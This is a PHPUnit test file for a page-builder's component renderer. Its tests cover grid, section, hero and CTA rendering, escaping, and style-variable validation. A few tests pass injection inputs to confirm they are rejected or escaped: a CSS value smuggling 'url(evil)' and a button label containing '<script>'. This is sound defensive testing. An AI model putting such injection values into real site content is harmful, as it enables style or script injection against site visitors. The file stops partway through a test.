<?php
/**
 * tests/ComponentPropsTest.php — PHPUnit tests for hero spacing and section centered layout
 *
 * Covers: data-pp-spacing on hero (only component retaining spacing prop),
 *         and section centered layout variant.
 */

use PHPUnit\Framework\TestCase;

class ComponentPropsTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();
        $GLOBALS['_pp_test_store'] = [
            'post_meta'  => [],
            'posts'      => [],
            'options'    => [],
            'next_id'    => 100,
            'custom_css' => '',
        ];
    }

    /**
     * Helper: render a component and return its HTML output.
     *
     * The `finally` is load-bearing (#705). A component template that throws — which is
     * exactly what the stored-shape guard tests exist to detect the absence of — would
     * otherwise escape with the buffer still open, so PHPUnit reports "did not close its
     * own output buffers" (a RISKY test) on top of the real error, and the orphaned
     * buffer can swallow output later in the same process. Closing it here means a
     * regression arrives as a clean, readable failure. Same reasoning, same shape as
     * StoredBackgroundImageRenderGuardTest::renderStored().
     */
    private function render(string $component, array $props): string
    {
        ob_start();
        try {
            pp_get_component($component, $props);
        } finally {
            $html = ob_get_clean();
        }
        return $html;
    }

    // ── A retired cta prop name renders the SCHEMA DEFAULT (#604) ────────────
    //
    // SUPERSEDES testLegacyCtaPropsRenderAuthoredButtonAfterResolution (#495 -> #604).
    //
    // A pre-1.0 cta stored cta_text/cta_url; the renderer reads button_text/button_url.
    // The alias map used to bridge that gap on the render path, so the authored label
    // appeared. #604 removed the map, so nothing bridges it any more: the authored
    // value is simply not read, and the renderer falls back to its own default.
    //
    // SCOPE, stated honestly: this renders through pp_get_component() DIRECTLY, so it
    // exercises the cta template and nothing else — it is a renderer-level CONTROL, not
    // a tripwire. It would have passed before #604 too, because the template never read
    // `cta_text`; the alias resolution it is documenting happened upstream on the read
    // path. The test that actually discriminates (seeds stored bytes and renders them
    // through the real read path) is
    // StoredCompositionAliasRenderTest::testStoredRetiredCtaPropRendersTheSchemaDefault.
    // Kept because it isolates WHICH layer drops the value: the renderer, not a guard.

    public function testRetiredCtaPropNameRendersTheSchemaDefaultNotTheAuthoredValue(): void
    {
        $html = $this->render('cta', [
            'cta_text' => 'View on GitHub',
            'cta_url'  => 'https://example.com/repo',
        ]);

        $this->assertStringNotContainsString('View on GitHub', $html, 'the retired label is not read by the renderer');
        $this->assertStringNotContainsString('https://example.com/repo', $html, 'the retired url is not read either');
        // The band still renders — the failure mode is a lost value, never a fatal.
        $this->assertStringContainsString('data-pp-component="cta"', $html, 'the band still renders');
    }

    public function testCanonicalCtaPropsStillRenderTheAuthoredButton(): void
    {
        // The control: the canonical names render exactly as before the removal, so the
        // test above is evidence about the RETIRED name and not about the renderer.
        $html = $this->render('cta', [
            'button_text' => 'View on GitHub',
            'button_url'  => 'https://example.com/repo',
        ]);

        $this->assertStringContainsString('View on GitHub', $html);
        $this->assertStringContainsString('https://example.com/repo', $html);
    }

    // ── Section Centered Layout ────────────────────────────────────────────

    public function testSectionCenteredIsValidLayout(): void
    {
        $html = $this->render('section', [
            'body' => '<p>Centered content</p>',
            'layout' => 'centered',
        ]);
        $this->assertStringContainsString('section--centered', $html);
    }

    public function testSectionCenteredRendersBodyWithoutImageDiv(): void
    {
        $html = $this->render('section', [
            'body' => '<p>Body text</p>',
            'layout' => 'centered',
        ]);
        $this->assertStringContainsString('section__body', $html);
        $this->assertStringNotContainsString('section__image', $html);
        $this->assertStringNotContainsString('section__grid', $html);
    }

    public function testSectionCenteredHasCenteredClass(): void
    {
        $html = $this->render('section', [
            'body' => '<p>Content</p>',
            'layout' => 'centered',
        ]);
        $this->assertStringContainsString('class="section section--centered"', $html);
    }

    // ── Grid card_emphasis opt-out (issue 226) ─────────────────────────────
    // 'uniform' emits .grid--uniform, which the featured :first-child selectors
    // guard with :not(.grid--uniform) so a symmetric card row renders equal
    // cards. Default 'featured' emits NO class (byte-identical existing pages).

    public function testGridUniformEmphasisEmitsClass(): void
    {
        $html = $this->render('grid', [
            'card_emphasis' => 'uniform',
            'items' => [['title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringContainsString('grid--uniform', $html);
    }

    public function testGridFeaturedEmphasisEmitsNoClassAndStaysByteIdentical(): void
    {
        $html = $this->render('grid', [
            'card_emphasis' => 'featured',
            'items' => [['title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringNotContainsString('grid--uniform', $html);
        // Explicit 'featured' must render exactly like the historical default:
        // the bare root class, no emphasis modifier.
        $this->assertStringContainsString('class="grid"', $html);
    }

    public function testGridAbsentEmphasisEmitsNoUniformClass(): void
    {
        $html = $this->render('grid', [
            'items' => [['title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringNotContainsString('grid--uniform', $html);
        $this->assertStringContainsString('class="grid"', $html);
    }

    public function testGridInvalidEmphasisFallsBackToFeatured(): void
    {
        $html = $this->render('grid', [
            'card_emphasis' => 'bogus',
            'items' => [['title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringNotContainsString('grid--uniform', $html);
    }

    public function testGridUniformComposesWithThemeAndLayoutClasses(): void
    {
        $html = $this->render('grid', [
            'card_emphasis' => 'uniform',
            'theme' => 'muted',
            'items' => [['title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringContainsString('grid--dark', $html);
        $this->assertStringContainsString('grid--uniform', $html);
    }

    public function testGridUniformClassIsEmittedEvenOnStepsLayout(): void
    {
        // 'uniform' is a cards-layout concept and inert on steps (the featured
        // CSS rules already carry :not(.grid--steps)). The class is still emitted
        // so that if a future steps-specific first-card emphasis rule is ever
        // added, it can be guarded with the same :not(.grid--uniform) hook.
        $html = $this->render('grid', [
            'card_emphasis' => 'uniform',
            'layout' => 'steps',
            'items' => [['number' => '1', 'title' => 'One', 'text' => 'a']],
        ]);
        $this->assertStringContainsString('grid--steps', $html);
        $this->assertStringContainsString('grid--uniform', $html);
    }

    // ── Grid explicit column-count control (issue 379) ─────────────────────
    // `columns` (integer 1-4) emits data-pp-columns on the .grid__list; the CSS
    // reads it to force the desktop track count. Unset emits NO attribute so the
    // auto-by-count grain (data-pp-count only) stays byte-identical. Write-time
    // validation rejects out-of-range values; the renderer additionally coerces
    // raw-written invalid state to "no attribute" (defensive, like layout/theme).

    public function testGridColumnsEmitsDataAttributeWhenSet(): void
    {
        $html = $this->render('grid', [
            'columns' => 3,
            'items' => [['title' => 'One'], ['title' => 'Two'], ['title' => 'Three']],
        ]);
        $this->assertStringContainsString('data-pp-columns="3"', $html);
        // The auto-count attribute is still present alongside the override.
        $this->assertStringContainsString('data-pp-count="3"', $html);
    }

    public function testGridColumnsAcceptsIntegerStringValue(): void
    {
        // Admin/JSON payloads can arrive stringified; "4" must render like 4.
        $html = $this->render('grid', [
            'columns' => '4',
            'items' => [['title' => 'One']],
        ]);
        $this->assertStringContainsString('data-pp-columns="4"', $html);
    }

    public function testGridColumnsUnsetEmitsNoAttributeAndStaysByteIdentical(): void
    {
        $withUnset = $this->render('grid', [
            'items' => [['title' => 'One'], ['title' => 'Two']],
        ]);
        $this->assertStringNotContainsString('data-pp-columns', $withUnset);

        // Byte-identical to an explicit empty-string "unset" sentinel.
        $withEmpty = $this->render('grid', [
            'columns' => '',
            'items' => [['title' => 'One'], ['title' => 'Two']],
        ]);
        $this->assertSame($withUnset, $withEmpty);
    }

    public function testGridColumnsCoercesOutOfRangeRawValueToNoAttribute(): void
    {
        // Defence-in-depth for state written through a raw, non-validating path:
        // an out-of-range value must not emit an attribute the CSS can't honor.
        foreach (['0', '5', '-1', '2.5', 'bogus'] as $bad) {
            $html = $this->render('grid', [
                'columns' => $bad,
                'items' => [['title' => 'One']],
            ]);
            $this->assertStringNotContainsString(
                'data-pp-columns',
                $html,
                "columns={$bad} must not emit a data-pp-columns attribute"
            );
        }
    }

    public function testGridColumnsIsInertOnStepsLayout(): void
    {
        // columns is a cards concept; the steps layout keeps its fixed process
        // grain. The renderer must NOT emit data-pp-columns on steps (the CSS is
        // also scoped :not(.grid--steps), but the markup itself stays honest and
        // byte-identical), so steps output never carries a dead attribute.
        $html = $this->render('grid', [
            'columns' => 3,
            'layout'  => 'steps',
            'items'   => [['number' => '1', 'title' => 'One']],
        ]);
        $this->assertStringNotContainsString('data-pp-columns', $html);
        $this->assertStringContainsString('grid--steps', $html);
    }

    public function testGridColumnsComposesWithThemeAndEmphasis(): void
    {
        $html = $this->render('grid', [
            'columns' => 2,
            'theme' => 'muted',
            'card_emphasis' => 'uniform',
            'items' => [['title' => 'One'], ['title' => 'Two']],
        ]);
        $this->assertStringContainsString('data-pp-columns="2"', $html);
        $this->assertStringContainsString('grid--dark', $html);
        $this->assertStringContainsString('grid--uniform', $html);
    }

    // ── Grid item image treatment (issue 380) ─────────────────────────────
    // `image_treatment: "icon"` emits the grid--image-icon variant class on the
    // section; the CSS reads it to render each card image at icon scale instead of
    // the 16:9 cover banner. Default/unset ("banner") emits NO class, so existing
    // pages stay byte-identical. Write-time validation rejects out-of-set values;
    // the renderer additionally coerces raw-written invalid state to "no class"
    // (defensive, like layout/theme). Icon is a cards concept: inert on steps.

    public function testGridImageTreatmentIconEmitsVariantClass(): void
    {
        $html = $this->render('grid', [
            'image_treatment' => 'icon',
            'items' => [['title' => 'One', 'image_url' => 'a.png', 'image_alt' => 'A']],
        ]);
        $this->assertStringContainsString('grid--image-icon', $html);
        // The image still renders inside its wrap; only the treatment class changes.
        $this->assertStringContainsString('grid__item-image-wrap', $html);
    }

    public function testGridImageTreatmentBannerAndUnsetEmitNoClassByteIdentical(): void
    {
        $withUnset = $this->render('grid', [
            'items' => [['title' => 'One', 'image_url' => 'a.png']],
        ]);
        $this->assertStringNotContainsString('grid--image-icon', $withUnset);

        // Explicit "banner" is byte-identical to omitting the key (the default).
        $withBanner = $this->render('grid', [
            'image_treatment' => 'banner',
            'items' => [['title' => 'One', 'image_url' => 'a.png']],
        ]);
        $this->assertSame($withUnset, $withBanner);
    }

    public function testGridImageTreatmentInvalidValueCoercesToBanner(): void
    {
        // Defence-in-depth for state written through a raw, non-validating path:
        // an unknown value must fall through to banner (no class), never leak a
        // dead grid--image-<x> class the CSS can't honor. Covers the same reject
        // shapes the write-time validator pins (unknown keyword, case mismatch,
        // numeric, whitespace-padded) plus the unset sentinels (empty/null), so
        // the render-layer coercion is proven at the same granularity as validation.
        foreach (['card', 'Icon', 'bogus', '', ' icon', 1, null] as $bad) {
            $html = $this->render('grid', [
                'image_treatment' => $bad,
                'items' => [['title' => 'One', 'image_url' => 'a.png']],
            ]);
            $this->assertStringNotContainsString(
                'grid--image-icon',
                $html,
                'image_treatment=' . var_export($bad, true) . ' must not emit the icon variant class'
            );
        }
    }

    public function testGridImageTreatmentIsInertOnStepsLayout(): void
    {
        // Icon treatment is a cards concept; steps renders no item images, so the
        // renderer must NOT emit grid--image-icon on steps (byte-identical steps).
        $html = $this->render('grid', [
            'image_treatment' => 'icon',
            'layout' => 'steps',
            'items' => [['number' => '1', 'title' => 'One']],
        ]);
        $this->assertStringNotContainsString('grid--image-icon', $html);
        $this->assertStringContainsString('grid--steps', $html);
    }

    public function testGridImageTreatmentComposesWithThemeEmphasisAndBullets(): void
    {
        $html = $this->render('grid', [
            'image_treatment' => 'icon',
            'theme' => 'muted',
            'card_emphasis' => 'uniform',
            'items' => [
                ['title' => 'One', 'image_url' => 'a.png', 'bullets' => ['Fast', 'Cheap']],
            ],
        ]);
        $this->assertStringContainsString('grid--image-icon', $html);
        $this->assertStringContainsString('grid--dark', $html);
        $this->assertStringContainsString('grid--uniform', $html);
        // Works alongside bullets on the same card.
        $this->assertStringContainsString('grid__item-bullet', $html);
    }

    public function testSectionCenteredSuppressesImageEvenWhenProvided(): void
    {
        $html = $this->render('section', [
            'body' => '<p>Content</p>',
            'layout' => 'centered',
            'image_url' => 'https://example.com/image.jpg',
        ]);
        $this->assertStringContainsString('section--centered', $html);
        $this->assertStringNotContainsString('section__image', $html);
        $this->assertStringNotContainsString('example.com/image.jpg', $html);
    }

    // ── Hero Spacing (hero retains spacing prop) ────────────────────────────

    public function testHeroSpacingOutputsAttribute(): void
    {
        $html = $this->render('hero', [
            'title' => 'Test Hero',
            'spacing' => 'spacious',
        ]);
        $this->assertStringContainsString('data-pp-spacing="spacious"', $html);
    }

    public function testHeroSpacingInvalidFallsBackToDefault(): void
    {
        $html = $this->render('hero', [
            'title' => 'Test Hero',
            'spacing' => 'huge',
        ]);
        $this->assertStringNotContainsString('data-pp-spacing', $html);
    }

    // ── Centered layout (unrelated to width/spacing props) ───────────────────

    public function testSectionCenteredRendersWithoutWidthOrSpacingAttributes(): void
    {
        $html = $this->render('section', [
            'body' => '<p>Content</p>',
            'layout' => 'centered',
        ]);
        $this->assertStringContainsString('section--centered', $html);
        $this->assertStringNotContainsString('data-pp-spacing', $html);
        $this->assertStringNotContainsString('data-pp-width', $html);
    }

    // ── Regression: stripped components ignore width/spacing ──────────────

    /**
     * @dataProvider strippedComponentProvider
     */
    public function testStrippedComponentIgnoresWidth(string $component, array $baseProps): void
    {
        $html = $this->render($component, array_merge($baseProps, ['width' => 'narrow']));
        $this->assertStringNotContainsString('data-pp-width', $html);
    }

    /**
     * @dataProvider strippedComponentProvider
     */
    public function testStrippedComponentIgnoresSpacing(string $component, array $baseProps): void
    {
        $html = $this->render($component, array_merge($baseProps, ['spacing' => 'compact']));
        $this->assertStringNotContainsString('data-pp-spacing', $html);
    }

    public static function strippedComponentProvider(): array
    {
        return [
            'section' => ['section', ['body' => '<p>Test</p>']],
            'cta'     => ['cta', ['title' => 'Test', 'button_text' => 'Go']],
            'grid'    => ['grid', ['items' => [['title' => 'A', 'body' => 'B']]]],
            'stats'   => ['stats', ['items' => [['number' => '10', 'label' => 'X']]]],
            'logos'   => ['logos', ['items' => [['image_url' => 'logo.png']]]],
            'embed'   => ['embed', ['content' => '<p>Embed</p>']],
        ];
    }

    // ── pp_render_style_vars() ───────────────────────────────────────────

    public function testRenderStyleVarsBasic(): void
    {
        $result = pp_render_style_vars(
            ['--hero-bg' => '#1a1a2e', '--hero-padding-top' => '8rem'],
            'hero'
        );
        $this->assertStringContainsString('--hero-bg: #1a1a2e', $result);
        $this->assertStringContainsString('--hero-padding-top: 8rem', $result);
    }

    public function testRenderStyleVarsEmpty(): void
    {
        $result = pp_render_style_vars([], 'hero');
        $this->assertSame('', $result);
    }

    public function testRenderStyleVarsSkipsUnknownSlot(): void
    {
        $result = pp_render_style_vars(
            ['--hero-bg' => '#1a1a2e', '--hero-display' => 'none'],
            'hero'
        );
        $this->assertStringContainsString('--hero-bg', $result);
        $this->assertStringNotContainsString('--hero-display', $result);
    }

    public function testRenderStyleVarsEmitsKeywordAndVarReferenceUnchanged(): void
    {
        // #230: an accepted value must SURVIVE to CSS output — esc_attr touches
        // none of ( ) - so the reference reaches the browser intact.
        $result = pp_render_style_vars(
            ['--hero-button2-bg' => 'transparent', '--hero-accent' => 'var(--color-accent)'],
            'hero'
        );
        $this->assertStringContainsString('--hero-button2-bg: transparent', $result);
        $this->assertStringContainsString('--hero-accent: var(--color-accent)', $result);
    }

    public function testRenderStyleVarsSkipsRecipeKey(): void
    {
        $result = pp_render_style_vars(
            ['__recipe' => 'dark-spacious', '--hero-bg' => '#1a1a2e'],
            'hero'
        );
        $this->assertStringNotContainsString('__recipe', $result);
        $this->assertStringContainsString('--hero-bg', $result);
    }

    public function testRenderStyleVarsRejectsInjection(): void
    {
        $result = pp_render_style_vars(
            ['--hero-bg' => '#fff; background-image: url(evil)'],
            'hero'
        );
        // Semicolon in value triggers injection guard — slot is skipped.
        $this->assertSame('', $result);
    }

    // ── Gradient-typed style slots render unmangled (#99) ────────────────

    public function testRenderStyleVarsGradientSurvivesUnmangledForHero(): void
    {
        // A validated gradient round-trips unmangled through the render
        // boundary: pp_render_style_vars() re-validates via the shared engine
        // (issue #330), and a valid gradient passes, reaching CSS output exactly
        // like a flat color already does (testRenderStyleVarsBasic above).
        $result = pp_render_style_vars(
            ['--hero-bg' => 'linear-gradient(135deg, #1a1a2e, #16121f)'],
            'hero'
        );
        $this->assertStringContainsString('--hero-bg: linear-gradient(135deg, #1a1a2e, #16121f)', $result);
    }

    public function testRenderStyleVarsGradientSurvivesUnmangledForCta(): void
    {
        $result = pp_render_style_vars(
            ['--cta-bg' => 'radial-gradient(circle, #fff, #000)'],
            'cta'
        );
        $this->assertStringContainsString('--cta-bg: radial-gradient(circle, #fff, #000)', $result);
    }

    public function testRenderStyleVarsGradientSurvivesUnmangledForGrid(): void
    {
        $result = pp_render_style_vars(
            ['--grid-item-bg' => 'linear-gradient(180deg, #fff, #eee)'],
            'grid'
        );
        $this->assertStringContainsString('--grid-item-bg: linear-gradient(180deg, #fff, #eee)', $result);
    }

    public function testRenderStyleVarsGradientSurvivesUnmangledForSection(): void
    {
        $result = pp_render_style_vars(
            ['--section-bg' => 'linear-gradient(to bottom, #f0f4ff, #ffffff)'],
            'section'
        );
        $this->assertStringContainsString('--section-bg: linear-gradient(to bottom, #f0f4ff, #ffffff)', $result);
    }

    public function testRenderStyleVarsGradientOverlayScrimSurvivesUnmangled(): void
    {
        // The primary practical motivation for gradient support: a
        // transparent-to-dark scrim over a background image for legibility.
        $result = pp_render_style_vars(
            ['--hero-overlay-bg' => 'linear-gradient(to bottom, transparent, rgba(0,0,0,0.7))'],
            'hero'
        );
        $this->assertStringContainsString('--hero-overlay-bg: linear-gradient(to bottom, transparent, rgba(0,0,0,0.7))', $result);
    }

    public function testHeroComponentRendersGradientBackgroundInInlineStyle(): void
    {
        // End-to-end: a gradient value set on a real component's __pp_style
        // survives all the way into the rendered <section style="..."> output,
        // exactly the "exact production regression" pattern used for #36.
        $html = $this->render('hero', [
            'title' => 'Welcome',
            '__pp_style' => ['--hero-bg' => 'linear-gradient(135deg, #1a1a2e, #16121f)'],
        ]);
        $this->assertStringContainsString('--hero-bg: linear-gradient(135deg, #1a1a2e, #16121f)', $html);
    }

    public function testRenderStyleVarsUnknownComponent(): void
    {
        $result = pp_render_style_vars(
            ['--fake-bg' => '#000'],
            'nonexistent'
        );
        $this->assertSame('', $result);
    }

    // ── CTA button_variant (prop, set via update_component) ──────────────

    private function ctaProps(array $extra = []): array
    {
        return array_merge(['title' => 'T', 'button_text' => 'Go', 'button_url' => '#'], $extra);
    }

    public function testCtaButtonVariantPrimaryIsBareBtn(): void
    {
        $html = $this->render('cta', $this->ctaProps(['button_variant' => 'primary']));
        $this->assertStringContainsString('class="cta__button btn"', $html);
        $this->assertStringNotContainsString('btn--', $html);
    }

    public function testCtaButtonVariantSecondary(): void
    {
        $html = $this->render('cta', $this->ctaProps(['button_variant' => 'secondary']));
        $this->assertStringContainsString('btn--secondary', $html);
    }

    public function testCtaButtonVariantOutline(): void
    {
        $html = $this->render('cta', $this->ctaProps(['button_variant' => 'outline']));
        $this->assertStringContainsString('btn--outline', $html);
    }

    public function testCtaButtonVariantGhost(): void
    {
        $html = $this->render('cta', $this->ctaProps(['button_variant' => 'ghost']));
        $this->assertStringContainsString('btn--ghost', $html);
    }

    public function testCtaButtonVariantInvalidFallsBackToPrimary(): void
    {
        $html = $this->render('cta', $this->ctaProps(['button_variant' => 'neon']));
        $this->assertStringContainsString('class="cta__button btn"', $html);
        $this->assertStringNotContainsString('btn--', $html);
    }

    public function testCtaButtonVariantDefaultsToPrimary(): void
    {
        $html = $this->render('cta', $this->ctaProps());
        $this->assertStringContainsString('class="cta__button btn"', $html);
        $this->assertStringNotContainsString('btn--', $html);
    }

    // ── CTA second button (issue 474) ──────────────────────────────────────
    //
    // A closing CTA can offer a primary + secondary pair, the hero's cta2 pattern
    // scoped to cta. The hard contract is that an UNSET second button renders the
    // component byte-for-byte as before: no wrapper element, no extra anchor.

    public function testCtaWithoutButton2IsByteIdenticalToBefore(): void
    {
        $baseline = $this->render('cta', $this->ctaProps());

        // Structural: no wrapper element, no second anchor.
        $this->assertStringNotContainsString('cta__buttons', $baseline, 'no pair wrapper on a single-button cta');
        $this->assertStringNotContainsString('cta__button--secondary', $baseline);
        $this->assertSame(1, substr_count($baseline, '<a href='), 'exactly one button anchor');

        // WHITESPACE-EXACT: the guarantee documented in schema.json/README/composition.md
        // is byte-for-byte, and the obvious implementation breaks it invisibly — an
        // INDENTED `if`/`endif` control tag prints its own leading spaces even when the
        // branch is false, which silently added 24 bytes ahead of the primary anchor.
        // Pin the exact indentation so a future re-indent of those tags fails here
        // instead of quietly widening the diff on every existing page.
        $this->assertMatchesRegularExpression(
            '/\n {12}<a href="#" class="cta__button btn">/',
            $baseline,
            'the primary anchor must keep exactly its pre-474 indentation — the false '
            . 'button2 branch must emit no bytes at all'
        );
        $this->assertDoesNotMatchRegularExpression(
            '/\n {13,}<a href="#" class="cta__button btn">/',
            $baseline,
            'stray indentation leaked from the unset second button branch'
        );

        // An explicit empty button2_text behaves exactly like the prop being absent.
        $this->assertSame(
            $baseline,
            $this->render('cta', $this->ctaProps(['button2_text' => ''])),
            'an explicit empty button2_text must not change a single byte of the render'
        );
    }

    /** @dataProvider button2NonLabelProvider */
    public function testCtaButton2NonScalarOrEmptyLabelRendersNoSecondButton($label): void
    {
        // restore_composition never blocks on validation (#233), so a legacy/raw-written
        // snapshot can put a boolean or array here. Neither may render a button with an
        // empty accessible name or the literal text "Array".
        $html = $this->render('cta', $this->ctaProps([
            'button2_text' => $label,
            'button2_url'  => '/contacto',
        ]));
        $this->assertStringNotContainsString('cta__buttons', $html);
        $this->assertStringNotContainsString('cta__button--secondary', $html);
        $this->assertStringNotContainsString('Array', $html);
        $this->assertSame(1, substr_count($html, '<a href='), 'exactly one button anchor');
    }

    public static function button2NonLabelProvider(): array
    {
        return [
            'empty string' => [''],
            'false'        => [false],
            'null'         => [null],
            'array'        => [['a' => 'b']],
        ];
    }

    public function testCtaButton2ZeroLabelStillRenders(): void
    {
        // "0" is a legitimate label; the is_scalar guard must not drop it the way a
        // bare truthy check would.
        $html = $this->render('cta', $this->ctaProps(['button2_text' => '0', 'button2_url' => '/x']));
        $this->assertStringContainsString('cta__button--secondary', $html);
        $this->assertSame(2, substr_count($html, '<a href='));
    }

    public function testCtaButton2UrlWithoutTextRendersNoSecondButton(): void
    {
        // button2_text is the gate (mirroring hero, where button2_text gates button2_url), so
        // a URL authored without a label is a silent no-op rather than an empty button.
        $html = $this->render('cta', $this->ctaProps(['button2_url' => '/contacto']));
        $this->assertStringNotContainsString('cta__buttons', $html);
        $this->assertStringNotContainsString('/contacto', $html);
        $this->assertSame(1, substr_count($html, '<a href='), 'exactly one button anchor');
    }

    public function testCtaButton2RendersPairInsideWrapper(): void
    {
        $html = $this->render('cta', $this->ctaProps([
            'button2_text' => 'Hablar con nosotros',
            'button2_url'  => '/contacto',
        ]));

        $this->assertStringContainsString('<div class="cta__buttons">', $html, 'the pair needs its own flex row');
        $this->assertStringContainsString('class="cta__button btn"', $html, 'primary keeps the bare .btn');
        $this->assertStringContainsString('class="cta__button cta__button--secondary btn btn--outline"', $html);
        $this->assertStringContainsString('href="/contacto"', $html);
        $this->assertStringContainsString('Hablar con nosotros', $html);
        $this->assertSame(2, substr_count($html, '<a href='), 'exactly two button anchors');
    }

    public function testCtaButton2DefaultsToOutline(): void
    {
        // Mirrors hero's button2_variant default: the pair reads as one filled action
        // and one outlined action without the author selecting a variant.
        $html = $this->render('cta', $this->ctaProps(['button2_text' => 'Secondary']));
        $this->assertStringContainsString('cta__button--secondary btn btn--outline', $html);
    }

    public function testCtaButton2VariantPrimaryIsBareBtn(): void
    {
        $html = $this->render('cta', $this->ctaProps([
            'button2_text'    => 'Secondary',
            'button2_variant' => 'primary',
        ]));
        $this->assertStringContainsString('class="cta__button cta__button--secondary btn"', $html);
    }

    /** @dataProvider button2VariantProvider */
    public function testCtaButton2VariantMapsToModifier(string $variant, string $expected): void
    {
        $html = $this->render('cta', $this->ctaProps([
            'button2_text'    => 'Secondary',
            'button2_variant' => $variant,
        ]));
        $this->assertStringContainsString('cta__button--secondary btn ' . $expected, $html);
    }

    public static function button2VariantProvider(): array
    {
        return [
            'secondary' => ['secondary', 'btn--secondary'],
            'outline'   => ['outline', 'btn--outline'],
            'ghost'     => ['ghost', 'btn--ghost'],
        ];
    }

    public function testCtaButton2VariantInvalidFallsBackToOutline(): void
    {
        // Unlike the primary (which falls back to `primary`), an unrecognized
        // second-button variant falls back to the secondary default.
        $html = $this->render('cta', $this->ctaProps([
            'button2_text'    => 'Secondary',
            'button2_variant' => 'neon',
        ]));
        $this->assertStringContainsString('cta__button--secondary btn btn--outline', $html);
    }

    public function testCtaButton2TextAndUrlAreEscaped(): void
    {
        $html = $this->render('cta', $this->ctaProps([
            'button2_text' => 'Tom & Jerry <script>',
            'button2_url'  => '/a?b=1&c=2',
        ]));
        $this->assertStringNotContainsString('<script>', $html, 'button2_text is plain text');
        $this->assertStringContainsString('Tom &amp; Jerry &lt;script&gt;', $html);
        // The href must carry the esc_url()-processed value, not the raw prop. Comparing
        // against esc_url() itself keeps this honest under the test bootstrap's stub
        // while still failing if esc_url() is dropped from the anchor.
        $this->assertStringContainsString('href="' . esc_url('/a?b=1&c=2') . '"', $html);
    }

    public function testCtaButton2UrlActuallyPassesThroughEscUrl(): void
    {
        // Non-tautological on purpose: a space is one of the few characters BOTH the
        // test bootstrap's esc_url() stub (FILTER_SANITIZE_URL strips it) and real
        // WordPress esc_url() (encodes it as %20) transform. Asserting the raw value is
        // ABSENT is what fails if esc_url() is ever dropped from the anchor; asserting
        // against esc_url() itself keeps the expectation correct under either engine.
        // (Quote-stripping is deliberately NOT asserted here — real esc_url() strips
        // `"`, but the stub does not, so such a test would fail against safe code.)
        $raw  = '/a b?c=1';
        $html = $this->render('cta', $this->ctaProps([
            'button2_text' => 'Secondary',
            'button2_url'  => $raw,
        ]));

        $this->assertStringContainsString('href="' . esc_url($raw) . '"', $html);
        $this->assertStringNotContainsString('href="' . $raw . '"', $html, 'button2_url must be escaped, not emitted raw');
    }

    public function testCtaButton2RendersOnTitlelessStandaloneRow(): void
    {
        // The pair must also work as the sanctioned heading-less button row (#294),
        // where the wrapper is the ONLY child of .cta__inner.
        $html = $this->render('cta', [
            'button_text'  => 'Ver planes',
            'button_url'   => '/precios',
            'button2_text' => 'Hablar',
            'button2_url'  => '/contacto',
        ]);
        $this->assertStringContainsString('cta__buttons', $html);
        $this->assertStringNotContainsString('cta__text', $html);
        $this->assertStringNotContainsString('<h2', $html);
        $this->assertSame(2, substr_count($html, '<a href='));
    }

    // ── Title-less CTA = standalone button row (issue 294) ─────────────────

    public function testCtaTitlelessRendersNoHeading(): void
    {
        // A CTA with only button props renders the button, but no <h2> heading
        // and no empty text wrapper (which would add a stray flex gap / break
        // the inline space-between layout).
        $html = $this->render('cta', ['button_text' => 'Empezar', 'button_url' => '/signup']);
        $this->assertStringContainsString('class="cta__button btn"', $html);
        $this->assertStringContainsString('Empezar', $html);
        $this->assertStringNotContainsString('cta__title', $html);
        $this->assertStringNotContainsString('<h2', $html);
        $this->assertStringNotContainsString('cta__text', $html);
    }

    public function testCtaTitlelessKeepsAnchorId(): void
    {
        // id/anchor must keep working on a title-less CTA.
        $html = $this->render('cta', [
            'id'          => 'closing-cta',
            'button_text' => 'Go',
            'button_url'  => '/',
        ]);
        $this->assertStringContainsString('id="closing-cta"', $html);
    }

    public function testCtaWithTitleStillRendersHeading(): void
    {
        // Regression guard: supplying a title must still emit the heading and
        // the text wrapper (unchanged behavior).
        $html = $this->render('cta', $this->ctaProps());
        $this->assertStringContainsString('cta__text', $html);
        $this->assertStringContainsString('<h2 class="cta__title"', $html);
    }

    public function testCtaEyebrowOnlyStillRendersTextWrapper(): void
    {
        // The text wrapper appears whenever eyebrow OR title OR text is present,
        // even without a title.
        $html = $this->render('cta', [
            'eyebrow'     => 'NEW',
            'button_text' => 'Go',
            'button_url'  => '/',
        ]);
        $this->assertStringContainsString('cta__text', $html);
        $this->assertStringContainsString('cta__eyebrow', $html);
        $this->assertStringNotContainsString('<h2', $html);
    }

    // ── Hero CTA variants (props, set via update_component) — #93 ───────────
    // Extends the shared .btn--*/--btn-* primitive (established for CTA above)
    // to hero's two CTA buttons, which previously hardcoded bare .btn / .btn--outline
    // with no way to select secondary/ghost. button2_variant defaults to 'outline'
    // to preserve the historical always-outline second button.

    private function heroProps(array $extra = []): array
    {
        return array_merge(['title' => 'T', 'button_text' => 'Go', 'button2_text' => 'Learn more'], $extra);
    }

    public function testHeroCtaVariantDefaultsToPrimary(): void
    {
        $html = $this->render('hero', $this->heroProps());
        $this->assertMatchesRegularExpression('/class="hero__cta btn"[^-]/', $html . ' ');
    }

    public function testHeroCta2VariantDefaultsToOutline(): void
    {
        // Preserves pre-#93 behavior: an unset button2_variant still renders outline.
        $html = $this->render('hero', $this->heroProps());
        $this->assertStringContainsString('class="hero__cta hero__cta--secondary btn btn--outline"', $html);
    }

    public function testHeroCtaVariantSecondary(): void
    {
        $html = $this->render('hero', $this->heroProps(['button_variant' => 'secondary']));
        $this->assertStringContainsString('class="hero__cta btn btn--secondary"', $html);
    }

    public function testHeroCtaVariantGhost(): void
    {
        $html = $this->render('hero', $this->heroProps(['button_variant' => 'ghost']));
        $this->assertStringContainsString('class="hero__cta btn btn--ghost"', $html);
    }

    public function testHeroCta2VariantPrimary(): void
    {
        $html = $this->render('hero', $this->heroProps(['button2_variant' => 'primary']));
        $this->assertStringContainsString('class="hero__cta btn"', $html);
        // Neither button should carry a btn-- modifier now.
        $this->assertSame(0, substr_count($html, 'btn--'));
    }

    public function testHeroCtaVariantInvalidFallsBackToPrimary(): void
    {
        $html = $this->render('hero', $this->heroProps(['button_variant' => 'neon']));
        $this->assertMatchesRegularExpression('/class="hero__cta btn"[^-]/', $html . ' ');
    }

    public function testHeroCta2VariantInvalidFallsBackToOutline(): void
    {
        $html = $this->render('hero', $this->heroProps(['button2_variant' => 'neon']));
